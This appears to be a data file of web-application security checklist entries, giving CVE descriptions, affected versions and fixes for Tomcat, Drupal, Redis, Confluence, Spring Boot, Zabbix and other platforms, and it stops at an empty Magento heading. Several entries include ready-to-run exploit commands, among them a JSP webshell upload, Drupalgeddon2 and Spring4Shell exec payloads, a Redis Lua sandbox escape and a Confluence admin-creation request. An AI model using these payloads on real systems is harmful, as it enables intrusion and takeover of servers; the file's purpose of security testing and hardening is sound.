### Check for exposed Tomcat Manager interface
<!-- id: tomcat-1 | severity: critical | tags: tomcat, manager, default-creds, rce -->
The Tomcat Manager at /manager/html allows WAR file deployment. Default or weak credentials (tomcat:tomcat, admin:admin) lead directly to Remote Code Execution.

**References:**
- https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html

### Check for Tomcat AJP Ghostcat (CVE-2020-1938)
<!-- id: tomcat-2 | severity: critical | tags: tomcat, ajp, file-read, cve -->
Versions before 9.0.31, 8.5.51, and 7.0.100 are vulnerable to the Ghostcat AJP connector flaw, allowing unauthenticated file read and include from the web root.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938

### Check for exposed Tomcat host-manager and examples
<!-- id: tomcat-3 | severity: medium | tags: tomcat, info-disclosure, examples -->
Tomcat ships with example JSP and servlet applications under /examples that are frequently left enabled, leaking server internals and session data.

**References:**
- https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html

### CVE-2025-24813 — RCE / file read via partial PUT (Important)
<!-- id: tomcat-cve-2025-24813 | severity: critical | tags: tomcat, cve, rce, partial-put, file-read -->
Vulnerable: Tomcat 9.0.0.M1–9.0.98, 10.1.0-M1–10.1.34, 11.0.0-M1–11.0.2. When partial PUT is enabled (default) and writes are enabled on the Default Servlet (non-default), attackers can view sensitive files and — if file-based session persistence is used — achieve RCE via deserialization of a crafted uploaded file. Upgrade to 9.0.99+.

**Commands:**
```
curl -X PUT https://target.com/.session_partial_1234 --data-binary @evil.ser
curl -X PUT https://target.com/session_partial_1234 --data-binary @evil.ser
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-24813

### CVE-2024-50379 + CVE-2024-56337 — RCE via write-enabled Default Servlet on case-insensitive filesystem
<!-- id: tomcat-cve-2024-50379 | severity: critical | tags: tomcat, cve, rce, default-servlet, file-upload, race-condition -->
Vulnerable: Tomcat 9.0.0.M1–9.0.97. If the Default Servlet has writes enabled (readonly=false) on a case-insensitive filesystem (Windows, macOS), a race condition between concurrent read and upload of the same file can bypass case sensitivity checks, causing an uploaded file to be treated as a JSP and executed. Fix: upgrade to 9.0.98+.

**Commands:**
```
// Send concurrent PUT + GET requests for the same filename with different case
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50379

### CVE-2020-9484 — RCE via session persistence deserialization
<!-- id: tomcat-cve-2020-9484 | severity: critical | tags: tomcat, cve, rce, deserialization, session-persistence -->
Vulnerable: Tomcat 9.0.0.M1–9.0.34. If FileStore session persistence is used with sessionAttributeValueClassNameFilter=null (default) and an attacker can control a file on the server, a crafted session cookie pointing to that file triggers Java deserialization and RCE. Upgrade to 9.0.35+.

**Commands:**
```
// Create serialized payload, write to /tmp/evil.session
// Set JSESSIONID=.evil to trigger FileStore deserialization
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484

### CVE-2017-12617 — RCE via HTTP PUT with JSP upload (Important)
<!-- id: tomcat-cve-2017-12617 | severity: critical | tags: tomcat, cve, rce, put, jsp-upload -->
Vulnerable: Tomcat 9.0.0.M1–9.0.0 (and 8.5.x, 7.x equivalents). When HTTP PUT is enabled (readonly=false on Default Servlet), a specially crafted PUT request uploads a JSP file which is then executed by requesting it. Upgrade to 9.0.1+.

**Commands:**
```
curl -X PUT 'https://target.com/shell.jsp/' -d '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
curl 'https://target.com/shell.jsp?cmd=id'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12617

### CVE-2019-0232 — RCE via Windows CGI (enableCmdLineArguments)
<!-- id: tomcat-cve-2019-0232 | severity: critical | tags: tomcat, cve, rce, cgi, windows -->
Vulnerable: Tomcat 9.0.0.M1–9.0.17 on Windows when CGI Servlet is enabled with enableCmdLineArguments=true. Due to a JRE bug in Windows argument passing, command injection via the URL is possible. Upgrade to 9.0.18+.

**Commands:**
```
curl 'https://target.com/cgi-bin/test.bat?&dir'
curl 'https://target.com/cgi-bin/test.bat?&whoami'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0232

### CVE-2023-44487 — HTTP/2 Rapid Reset DoS (Important)
<!-- id: tomcat-cve-2023-44487 | severity: high | tags: tomcat, cve, http2, dos, rapid-reset -->
Vulnerable: Tomcat 9.0.0.M1–9.0.80. Tomcat's HTTP/2 implementation is vulnerable to the Rapid Reset attack — attackers send many RST_STREAM frames after initiating streams, causing OutOfMemoryError and server DoS. Upgrade to 9.0.81+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-44487

### CVE-2023-46589 — Request smuggling via malformed HTTP trailer headers
<!-- id: tomcat-cve-2023-46589 | severity: high | tags: tomcat, cve, request-smuggling, http-trailer -->
Vulnerable: Tomcat 9.0.0.M1–9.0.82. Tomcat incorrectly parsed HTTP trailer headers. A specially crafted trailer header exceeding the size limit caused Tomcat to treat one request as multiple requests, enabling request smuggling behind a reverse proxy. Upgrade to 9.0.83+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46589

### CVE-2022-23181 — Local privilege escalation via FileStore race condition (TOCTOU)
<!-- id: tomcat-cve-2022-23181 | severity: medium | tags: tomcat, cve, privilege-escalation, toctou, local -->
Vulnerable: Tomcat 9.0.35–9.0.56. An incomplete fix for CVE-2020-9484 introduced a TOCTOU race condition allowing a local attacker to perform actions with the privileges of the Tomcat process when FileStore session persistence is configured. Upgrade to 9.0.58+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23181

---

## WordPress
<!-- id: wordpress | icon: 🛠️ | color: #e06c75 -->
Security checklists for WordPress — the world's most widely deployed content management system.

### Check for exposed WordPress login and admin panel
<!-- id: wp-1 | severity: medium | tags: wordpress, admin, brute-force -->
WordPress admin at /wp-admin/ and /wp-login.php is a high-value target. Test for weak passwords, XML-RPC brute-force amplification, and account lockout bypass.

**References:**
- https://www.wordfence.com/learn/wordpress-login-security/

### Check WordPress user enumeration via REST API
<!-- id: wp-2 | severity: medium | tags: wordpress, user-enum, rest-api -->
The WordPress REST API exposes usernames at /wp-json/wp/v2/users by default, giving attackers real account names for targeted credential attacks.

**References:**
- https://developer.wordpress.org/rest-api/reference/users/

### Check for vulnerable WordPress plugins and themes
<!-- id: wp-3 | severity: high | tags: wordpress, plugins, sqli, rce -->
Third-party plugins are the most common attack vector. Outdated or vulnerable plugins can allow SQLi, XSS, arbitrary file upload, and RCE.

**References:**
- https://wpscan.com/

### Check WordPress xmlrpc.php for brute-force and SSRF
<!-- id: wp-4 | severity: high | tags: wordpress, xmlrpc, brute-force, ssrf -->
xmlrpc.php enables multicall brute-force (thousands of password attempts in a single request) and can be abused for SSRF via the pingback feature.

**References:**
- https://www.wpwhitesecurity.com/wordpress-xmlrpc-attacks/

### CVE-2022-21661 — SQL injection via WP_Query (High)
<!-- id: wp-cve-2022-21661 | severity: high | tags: wordpress, cve, sqli, wp_query -->
Vulnerable: WordPress 5.8.0–5.8.2. Improper sanitization in WP_Query allows SQL injection when untrusted data is passed to tax_query, meta_query, or date_query. Affects any plugin or theme using WP_Query with user input. Upgrade to 5.8.3+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661

### CVE-2021-29447 — XXE via media file upload in WordPress 5.6–5.7 (High)
<!-- id: wp-cve-2021-29447 | severity: high | tags: wordpress, cve, xxe, media-upload, file-read -->
Vulnerable: WordPress 5.6.0–5.7.0. Uploading a specially crafted .wav file triggers XML parsing with external entity support, allowing an authenticated Author-level user to read arbitrary files from the server via XXE. Upgrade to 5.7.1+.

**Commands:**
```
// Create evil.wav with XXE payload in RIFF metadata
wp media import evil.wav
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447

### CVE-2023-2745 — Directory traversal via block themes in WordPress 6.x (Medium)
<!-- id: wp-cve-2023-2745 | severity: medium | tags: wordpress, cve, path-traversal, block-themes -->
Vulnerable: WordPress 6.0.0–6.2.0. The wp_template_part shortcode allows path traversal in the slug parameter, potentially exposing template files. Upgrade to 6.2.1+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745

---

## Drupal
<!-- id: drupal | icon: 🛠️ | color: #e06c75 -->
Security checklists for Drupal CMS hardening and common vulnerability testing.

### Check for Drupalgeddon2 RCE (CVE-2018-7600)
<!-- id: drupal-1 | severity: critical | tags: drupal, rce, cve, drupalgeddon -->
Drupalgeddon2 allows unauthenticated Remote Code Execution on unpatched Drupal 6, 7, and 8 installations via a Form API input validation flaw.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600

### Check for exposed Drupal install.php and update.php
<!-- id: drupal-2 | severity: high | tags: drupal, install, misconfiguration -->
Drupal install.php and update.php left accessible post-installation allow attackers to reset or reinstall the CMS, overwriting the database configuration entirely.

**References:**
- https://www.drupal.org/docs/security-in-drupal

### CVE-2018-7600 — Drupalgeddon2: Unauthenticated RCE (Critical)
<!-- id: drupal-cve-2018-7600 | severity: critical | tags: drupal, cve, rce, drupalgeddon2 -->
Vulnerable: Drupal 6.x, 7.x before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, 8.5.x before 8.5.1. Form API input validation flaw allows unauthenticated attackers to execute arbitrary PHP code. Massively exploited within hours of disclosure.

**Commands:**
```
curl -v 'https://target.com/?q=user/register&element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600

### CVE-2018-7602 — Drupalgeddon3: Authenticated RCE via Views API (Critical)
<!-- id: drupal-cve-2018-7602 | severity: critical | tags: drupal, cve, rce, drupalgeddon3 -->
Vulnerable: Drupal 7.x before 7.59, 8.5.x before 8.5.3. A remote code execution vulnerability exists within multiple subsystems of Drupal, requiring an account with the ability to delete nodes. Upgrade to 7.59+ or 8.5.3+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7602

### CVE-2019-6340 — REST API unauthenticated RCE (Critical)
<!-- id: drupal-cve-2019-6340 | severity: critical | tags: drupal, cve, rce, rest-api -->
Vulnerable: Drupal 8.5.x before 8.5.11, 8.6.x before 8.6.10. Some field types do not properly sanitize data from non-form sources when the REST API is enabled, allowing unauthenticated RCE. Upgrade to 8.6.10+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6340

---

## phpMyAdmin
<!-- id: phpmyadmin | icon: 🛠️ | color: #e06c75 -->
Security checklists for exposed phpMyAdmin database management interfaces.

### Check for publicly accessible phpMyAdmin
<!-- id: phpmyadmin-1 | severity: critical | tags: phpmyadmin, unauthorized-access, database -->
phpMyAdmin exposed on the internet lets attackers browse, modify, and drop the underlying MySQL/MariaDB database with no additional effort.

**References:**
- https://www.phpmyadmin.net/security/

### Check phpMyAdmin for default or weak credentials
<!-- id: phpmyadmin-2 | severity: critical | tags: phpmyadmin, default-creds, brute-force -->
Many phpMyAdmin instances use default MySQL credentials (root with empty password) or weak admin passwords that are trivial to brute-force.

**References:**
- https://docs.phpmyadmin.net/en/latest/setup.html

### CVE-2016-5734 — RCE via preg_replace in table search (Critical)
<!-- id: phpmyadmin-cve-2016-5734 | severity: critical | tags: phpmyadmin, cve, rce, preg-replace -->
Vulnerable: phpMyAdmin 4.0.x–4.6.x. An authenticated user can execute arbitrary PHP code via the preg_replace /e modifier in table search. Upgrade to 4.6.4+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5734

### CVE-2020-26934 / CVE-2020-26935 — XSS and SQL injection (High)
<!-- id: phpmyadmin-cve-2020-26934 | severity: high | tags: phpmyadmin, cve, xss, sqli -->
Vulnerable: phpMyAdmin 4.9.x before 4.9.6 and 5.0.x before 5.0.3. CVE-2020-26934 allows stored XSS via script injection in the designer; CVE-2020-26935 allows SQL injection via user accounts in the pma_table_users table.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26934

---

## Redis
<!-- id: redis | icon: 🛠️ | color: #e06c75 -->
Security checklists for Redis in-memory data store — commonly found exposed without authentication.

### Check for unauthenticated Redis access
<!-- id: redis-1 | severity: critical | tags: redis, unauthorized-access, data-exposure -->
Redis instances without authentication expose all stored keys and values, and allow arbitrary command execution including file write to the server.

**References:**
- https://redis.io/docs/management/security/

### Check Redis for RCE via config rewrite
<!-- id: redis-2 | severity: critical | tags: redis, rce, config-manipulation -->
Unauthenticated Redis can write SSH authorized_keys, cron jobs, or webshells to disk using CONFIG SET dir and dbfilename followed by a BGSAVE command.

**References:**
- https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis

### CVE-2022-0543 — Lua sandbox escape leading to RCE (Critical, Debian/Ubuntu packages only)
<!-- id: redis-cve-2022-0543 | severity: critical | tags: redis, cve, rce, lua-sandbox, debian -->
Vulnerable: Redis packages on Debian/Ubuntu before Feb 2022. The Lua scripting engine in Debian-packaged Redis leaves the `package` global variable accessible, allowing sandbox escape and arbitrary code execution via EVAL. Not present in upstream Redis.

**Commands:**
```
redis-cli EVAL "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.3.so.0', 'luaopen_io'); local io = io_l(); local f = io.popen('id','r'); local res = f:read('*a'); f:close(); return res" 0
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0543

---

## MongoDB
<!-- id: mongodb | icon: 🛠️ | color: #e06c75 -->
Security checklists for MongoDB NoSQL database — frequently found exposed without authentication.

### Check for unauthenticated MongoDB access
<!-- id: mongodb-1 | severity: critical | tags: mongodb, unauthorized-access, data-exposure -->
MongoDB without authentication on port 27017 exposes all databases and collections to anyone on the network. Check for open instances via Shodan or direct probe.

**References:**
- https://www.mongodb.com/docs/manual/security/

### Check for MongoDB NoSQL injection
<!-- id: mongodb-2 | severity: high | tags: mongodb, nosql-injection, injection -->
Applications passing user input directly into MongoDB queries are vulnerable to NoSQL injection using operators like $gt, $ne, and $where, enabling auth bypass or data leakage.

**References:**
- https://portswigger.net/web-security/nosql-injection

### CVE-2021-20328 — Client-side field level encryption bypass (Medium)
<!-- id: mongodb-cve-2021-20328 | severity: medium | tags: mongodb, cve, encryption-bypass, client-side -->
Vulnerable: MongoDB drivers before specific versions. MongoDB's client-side field level encryption can be bypassed when automatic encryption is not used correctly, potentially exposing encrypted fields in plaintext.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-20328

---

## Microsoft IIS
<!-- id: microsoft-iis | icon: 🛠️ | color: #e06c75 -->
Security checklists for Microsoft Internet Information Services (IIS) web server hardening.

### Check IIS for short filename (8.3) enumeration
<!-- id: iis-1 | severity: medium | tags: iis, short-filename, info-disclosure -->
IIS on Windows allows enumeration of files and folders via tilde notation in URLs (e.g. /secret~1/), revealing hidden files and folder names even when directory listing is off.

**References:**
- https://soroush.me/downloadable/iis-shortname-scanner.pdf

### Check IIS for WebDAV misconfiguration
<!-- id: iis-2 | severity: high | tags: iis, webdav, file-upload, misconfiguration -->
IIS with WebDAV enabled and write permissions allows file upload via HTTP PUT, potentially enabling webshell deployment and full server compromise.

**References:**
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-webdav

---

## GitLab
<!-- id: gitlab | icon: 🛠️ | color: #e06c75 -->
Security checklists for GitLab self-hosted source code management platform hardening.

### Check for public GitLab repositories and groups
<!-- id: gitlab-1 | severity: high | tags: gitlab, exposure, source-code -->
Misconfigured GitLab instances may expose private repositories, internal groups, CI/CD variables, and full source code as publicly accessible without authentication.

**References:**
- https://docs.gitlab.com/ee/security/visibility.html

### Check GitLab for SSRF via integrations (CVE-2021-22214)
<!-- id: gitlab-2 | severity: critical | tags: gitlab, ssrf, cve -->
GitLab import and webhook features have historically allowed SSRF to reach internal services, cloud metadata endpoints, and Kubernetes API servers.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22214

### Check GitLab for exposed CI/CD pipeline variables
<!-- id: gitlab-3 | severity: high | tags: gitlab, cicd, secrets, info-disclosure -->
Publicly visible GitLab pipelines and pipeline artifacts may leak CI/CD environment variables containing API keys, deployment credentials, and cloud secrets.

**References:**
- https://docs.gitlab.com/ee/ci/variables/

### CVE-2021-22205 — Unauthenticated RCE via ExifTool image parsing (Critical)
<!-- id: gitlab-cve-2021-22205 | severity: critical | tags: gitlab, cve, rce, exiftool, image-upload -->
Vulnerable: GitLab CE/EE 11.9.0–13.10.2. An unauthenticated attacker can upload an image processed by ExifTool containing a DjVu file with malicious metadata, triggering RCE on the GitLab server. CVSS 10.0. Upgrade to 13.10.3+, 13.9.6+, or 13.8.8+.

**Commands:**
```
// Upload a malicious image to the GitLab instance via the /uploads API
curl -X POST https://target.com/uploads/user -F 'file=@evil_exif.jpg'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22205

### CVE-2023-7028 — Account takeover via password reset without user interaction (Critical, CVSS 10.0)
<!-- id: gitlab-cve-2023-7028 | severity: critical | tags: gitlab, cve, account-takeover, password-reset -->
Vulnerable: GitLab CE/EE 16.1.0–16.7.1. When a user signs up with a secondary email address, password resets can be delivered to unverified addresses. Attackers can register an account, add an existing user's email as secondary, and receive password reset tokens for that victim account. Upgrade to 16.7.2+, 16.6.4+, or 16.5.6+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-7028

### CVE-2022-2884 — RCE via GitHub import API (Critical)
<!-- id: gitlab-cve-2022-2884 | severity: critical | tags: gitlab, cve, rce, github-import -->
Vulnerable: GitLab CE/EE 14.6–15.1.1. An authenticated user can achieve remote code execution via the GitHub import API endpoint by injecting malicious content into imported repository data. Upgrade to 15.1.2+, 15.0.4+, or 14.10.5+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2884

---

## Atlassian Jira
<!-- id: jira | icon: 🛠️ | color: #e06c75 -->
Security checklists for Atlassian Jira project management platform hardening.

### Check Jira for unauthenticated user enumeration
<!-- id: jira-1 | severity: medium | tags: jira, user-enum, info-disclosure -->
Older Jira versions expose all usernames via the /rest/api/2/user/search?username= endpoint without requiring authentication, aiding targeted attacks.

**References:**
- https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-954177769.html

### Check Jira for sensitive project and issue exposure
<!-- id: jira-2 | severity: medium | tags: jira, info-disclosure, misconfiguration -->
Misconfigured Jira projects with public visibility expose internal bug reports, security tickets, infrastructure details, and roadmaps to unauthenticated users.

**References:**
- https://confluence.atlassian.com/adminjiraserver/configuring-jira-application-options-938847053.html

### CVE-2019-11581 — Server-Side Template Injection RCE (unauthenticated) — Critical
<!-- id: jira-cve-2019-11581 | severity: critical | tags: jira, cve, ssti, rce, unauthenticated -->
Vulnerable: Jira Server and Data Center before 7.6.14, 7.7.0–7.13.5, 8.0.0–8.3.4. Unauthenticated attackers can perform Server-Side Template Injection via the contact admin form, leading to RCE on the Jira server. Upgrade to 7.6.14+, 7.13.6+, 8.3.5+.

**Commands:**
```
curl -X POST 'https://target.com/secure/ContactAdministrators!default.jspa' --data 'subject=${7*7}&details=test'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11581

### CVE-2022-0540 — Authentication bypass in Jira and Jira Service Management (Critical)
<!-- id: jira-cve-2022-0540 | severity: critical | tags: jira, cve, auth-bypass, seraph -->
Vulnerable: Jira Server/DC before 8.13.18, 8.20.6, 8.22.0; Service Management before 4.13.18, 4.20.6, 4.22.0. The Seraph authentication framework allows unauthenticated access to Jira functions by sending a specially crafted HTTP request that bypasses authentication. Upgrade to fixed versions.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0540

### CVE-2021-26086 — File path traversal in Jira (Medium)
<!-- id: jira-cve-2021-26086 | severity: medium | tags: jira, cve, path-traversal, file-read -->
Vulnerable: Jira Server and DC before 8.5.14, 8.13.6, 8.14.1. A file path traversal vulnerability allows a remote unauthenticated attacker to read certain files from the Jira Server or Data Center installation.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26086

---

## Atlassian Confluence
<!-- id: confluence | icon: 🛠️ | color: #e06c75 -->
Security checklists for Atlassian Confluence wiki platform hardening.

### Check Confluence for unauthenticated RCE (CVE-2022-26134)
<!-- id: confluence-1 | severity: critical | tags: confluence, rce, ognl-injection, cve -->
CVE-2022-26134 allows unauthenticated OGNL injection in Confluence Server and Data Center before 7.18.1, leading to full Remote Code Execution via a crafted GET request.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134

### Check Confluence for exposed spaces and pages
<!-- id: confluence-2 | severity: medium | tags: confluence, info-disclosure, public-spaces -->
Confluence spaces with anonymous access enabled may expose internal documentation, stored credentials, infrastructure diagrams, and employee information to the public internet.

**References:**
- https://support.atlassian.com/confluence-cloud/docs/make-a-space-public/

### CVE-2022-26134 — OGNL injection unauthenticated RCE (Critical, CVSS 9.8)
<!-- id: confluence-cve-2022-26134 | severity: critical | tags: confluence, cve, rce, ognl-injection, unauthenticated -->
Vulnerable: Confluence Server and Data Center 1.3.0–7.18.0. A single malicious GET request containing OGNL expression injection in the URL causes unauthenticated RCE. Exploited as a zero-day in June 2022. Upgrade to 7.4.17+, 7.13.7+, 7.14.3+, 7.15.2+, 7.16.4+, 7.17.4+, 7.18.1+.

**Commands:**
```
curl -v 'https://target.com/%24%7B%28%23a%3D%40org.apache.tomcat.InstanceManager%40%40getDefault()%29.newInstance%28%40com.opensymphony.webwork.ServletActionContext%40getResponse().getClass()%29%7D/'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134

### CVE-2023-22515 — Broken Access Control: create admin account (Critical, CVSS 10.0)
<!-- id: confluence-cve-2023-22515 | severity: critical | tags: confluence, cve, privilege-escalation, admin-creation, bac -->
Vulnerable: Confluence Data Center and Server 8.0.0–8.5.1. External attackers can exploit a broken access control flaw to create unauthorized Confluence administrator accounts and access Confluence, leading to full system compromise. Upgrade to 8.3.3+, 8.4.3+, or 8.5.2+.

**Commands:**
```
curl -X POST 'https://target.com/setup/setupadministrator.action' -d 'username=hacker&fullName=hacker&email=hacker@evil.com&password=Hacked123&confirm=Hacked123&setup-next-button=Next'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22515

### CVE-2023-22518 — Authentication bypass allowing data destruction (Critical, CVSS 9.1)
<!-- id: confluence-cve-2023-22518 | severity: critical | tags: confluence, cve, auth-bypass, data-destruction -->
Vulnerable: All versions of Confluence Data Center and Server before patched versions. An improper authorization vulnerability allows an unauthenticated attacker to reset Confluence and create an admin account, deleting all Confluence data in the process.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22518

---

## Kubernetes Dashboard
<!-- id: kubernetes-dashboard | icon: 🛠️ | color: #e06c75 -->
Security checklists for Kubernetes Dashboard and API server exposure testing.

### Check for unauthenticated Kubernetes Dashboard access
<!-- id: k8s-1 | severity: critical | tags: kubernetes, dashboard, unauthorized-access -->
Kubernetes Dashboard without authentication enables full cluster management — pod creation, secret reading, and lateral movement to all running workloads.

**References:**
- https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/

### Check for exposed Kubernetes API server
<!-- id: k8s-2 | severity: critical | tags: kubernetes, api-server, unauthorized-access -->
The Kubernetes API on port 6443 (or 8080 insecure) without authentication allows cluster-wide control including reading all secrets and exec-ing into pods.

**References:**
- https://kubernetes.io/docs/reference/access-authn-authz/

### Check for exposed kubelet API (port 10250)
<!-- id: k8s-3 | severity: critical | tags: kubernetes, kubelet, rce, unauthorized-access -->
The kubelet API on port 10250 without authentication allows listing pods and executing arbitrary commands inside any container running on that node.

**References:**
- https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration

---

## Spring Boot
<!-- id: spring-boot | icon: 🛠️ | color: #e06c75 -->
Security checklists for Spring Boot Java applications focusing on Actuator endpoint exposure.

### Check for exposed Spring Boot Actuator endpoints
<!-- id: springboot-1 | severity: high | tags: spring-boot, actuator, info-disclosure -->
Spring Boot Actuator endpoints like /actuator/env, /actuator/heapdump, and /actuator/beans expose sensitive configuration, credentials, and application internals when publicly accessible.

**References:**
- https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html

### Check Spring Boot Actuator for RCE via env and restart
<!-- id: springboot-2 | severity: critical | tags: spring-boot, actuator, rce, ssrf -->
When Spring Cloud is present, modifying environment properties via /actuator/env and triggering /actuator/restart can achieve SSRF or Remote Code Execution.

**References:**
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators

### CVE-2022-22965 — Spring4Shell: RCE via data binding (Critical, CVSS 9.8)
<!-- id: springboot-cve-2022-22965 | severity: critical | tags: spring-boot, cve, rce, spring4shell, data-binding -->
Vulnerable: Spring Framework 5.3.x before 5.3.18, 5.2.x before 5.2.20, running on JDK 9+ with Spring MVC/WebFlux deployed as a WAR on Tomcat. An attacker can use data binding to set Tomcat ClassLoader properties and write a JSP webshell to the server.

**Commands:**
```
curl -X POST 'https://target.com/' --data 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B...'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965

### CVE-2022-22963 — Spring Cloud Function RCE via routing expression (Critical)
<!-- id: springboot-cve-2022-22963 | severity: critical | tags: spring-boot, cve, rce, spring-cloud, spel -->
Vulnerable: Spring Cloud Function 3.1.x before 3.1.7, 3.2.x before 3.2.3. Sending a crafted spring.cloud.function.routing-expression HTTP header containing a SpEL expression allows RCE on the server.

**Commands:**
```
curl -X POST 'https://target.com/functionRouter' -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("id")' --data 'test'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22963

---

## Swagger UI
<!-- id: swagger-ui | icon: 🛠️ | color: #e06c75 -->
Security checklists for exposed Swagger UI and OpenAPI documentation interfaces.

### Check for exposed Swagger UI leaking API structure
<!-- id: swagger-1 | severity: medium | tags: swagger, api-docs, info-disclosure -->
Swagger UI exposes all API endpoints, parameters, authentication schemes, and data models — providing a complete attack surface map to any visitor.

**References:**
- https://swagger.io/tools/swagger-ui/

### Check for unauthenticated API execution via Swagger UI
<!-- id: swagger-2 | severity: high | tags: swagger, api-testing, authentication-bypass -->
Swagger UI may allow direct invocation of internal and admin-level API functions without proper authentication, especially when an API key or Bearer token is pre-filled.

**References:**
- https://owasp.org/www-project-api-security/

---

## Prometheus
<!-- id: prometheus | icon: 🛠️ | color: #e06c75 -->
Security checklists for Prometheus monitoring system exposure and misconfiguration testing.

### Check for publicly exposed Prometheus /metrics endpoint
<!-- id: prometheus-1 | severity: medium | tags: prometheus, metrics, info-disclosure -->
The /metrics endpoint exposes detailed internal application metrics, infrastructure topology, service names, and sometimes credentials embedded in metric label values.

**References:**
- https://prometheus.io/docs/prometheus/latest/security/

### Check for Prometheus admin API access
<!-- id: prometheus-2 | severity: high | tags: prometheus, admin-api, data-deletion -->
The Prometheus admin API enabled via --web.enable-admin-api allows data deletion and TSDB snapshots without authentication by default.

**References:**
- https://prometheus.io/docs/prometheus/latest/querying/api/

---

## Zabbix
<!-- id: zabbix | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zabbix network monitoring platform hardening.

### Check for default Zabbix credentials
<!-- id: zabbix-1 | severity: critical | tags: zabbix, default-creds, unauthorized-access -->
Zabbix ships with default credentials (Admin / zabbix) that are frequently left unchanged, granting full platform access and potential RCE via user scripts.

**References:**
- https://www.zabbix.com/documentation/current/en/manual/installation/install#installing-frontend

### Check Zabbix for RCE via agent scripts
<!-- id: zabbix-2 | severity: critical | tags: zabbix, rce, agent, scripts -->
Authenticated Zabbix users with sufficient privileges can execute scripts on monitored hosts via the web UI, potentially leading to RCE across all monitored infrastructure.

**References:**
- https://blog.sonarsource.com/zabbix-case-study-of-unsafe-session-storage/

### CVE-2022-23131 — Authentication bypass via Zabbix SAML SSO (Critical, CVSS 9.8)
<!-- id: zabbix-cve-2022-23131 | severity: critical | tags: zabbix, cve, auth-bypass, saml, session-hijack -->
Vulnerable: Zabbix 5.4.0–5.4.8, 6.0.0. When SAML SSO authentication is enabled, the Zabbix frontend session is set on the client side and is not validated. An unauthenticated attacker can set a crafted ZBXSESSID cookie and access the Zabbix frontend without credentials. Upgrade to 5.4.9+ or 6.0.1+.

**Commands:**
```
// Set cookie ZBXSESSID with base64-encoded JSON containing saml_data user ID
curl -b 'ZBXSESSID=<crafted_b64_session>' https://target.com/zabbix/index.php
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23131

### CVE-2024-22120 — Time-based SQL injection in Zabbix Server (High)
<!-- id: zabbix-cve-2024-22120 | severity: high | tags: zabbix, cve, sqli, time-based -->
Vulnerable: Zabbix 6.0.0–6.0.27, 6.2.0–6.2.9, 6.4.0–6.4.12, 7.0.0alpha1–7.0.0beta2. A time-based blind SQL injection in the Zabbix Server allows a Zabbix user to perform database queries, potentially extracting sensitive data from the Zabbix database.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22120

---

## Magento
